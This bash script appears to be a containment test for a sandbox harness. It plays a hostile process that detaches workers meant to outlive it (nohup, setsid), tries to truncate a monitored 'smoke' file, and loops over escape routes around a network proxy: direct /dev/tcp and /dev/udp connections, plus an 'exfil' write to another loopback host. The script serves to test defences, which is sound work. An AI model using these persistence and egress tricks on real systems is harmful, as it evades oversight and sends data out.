#!/usr/bin/env bash
# Hostile fire for the fail-closed spike. Detaches, attacks its own smoke,
# and keeps trying every network route out, logging what works.
work=$1
common=$(dirname "$(dirname "$(readlink -f "$0")")")/common
dport=${DEST##*:}
CHIMNEY_PORT=$CHIMNEY
log() { echo "$(date +%s.%N) $*" >> "$work/net.log"; }

beat() { bash "$common/beat.sh" "$work" "$1"; }
beat child &
nohup bash "$common/beat.sh" "$work" nohup >/dev/null 2>&1 &
( setsid bash "$common/beat.sh" "$work" daemon </dev/null >/dev/null 2>&1 & )

: > "$SMOKE" 2>/dev/null && echo "smoke-truncate allowed" >> "$work/attempts.log" \
  || echo "smoke-truncate denied" >> "$work/attempts.log"

n=0
while :; do
  n=$((n + 1))
  # Through the chimney.
  if exec 3<>"/dev/tcp/127.0.0.1/$CHIMNEY_PORT" 2>/dev/null; then
    printf '%s\nping %d\n' "$DEST" "$n" >&3 2>/dev/null
    if read -t 1 -r reply <&3 && [[ $reply == "ping $n" ]]; then log chimney ok "$n"; else log chimney fail "$n"; fi
    exec 3>&-
  else
    log chimney fail "$n"
  fi
  # Around the chimney: same destination directly, over UDP, and to another host on the chimney's port.
  (exec 4<>"/dev/tcp/127.0.0.1/$dport") 2>/dev/null && log direct ok "$n" || log direct denied "$n"
  (echo "udp $n" > "/dev/udp/127.0.0.1/$dport") 2>/dev/null && log udp ok "$n" || log udp denied "$n"
  if (exec 5<>"/dev/tcp/127.0.0.2/$CHIMNEY_PORT" && printf 'exfil %d\n' "$n" >&5) 2>/dev/null; then
    log samePortOtherHost ok "$n"
  else
    log samePortOtherHost denied "$n"
  fi
  sleep 0.2
done
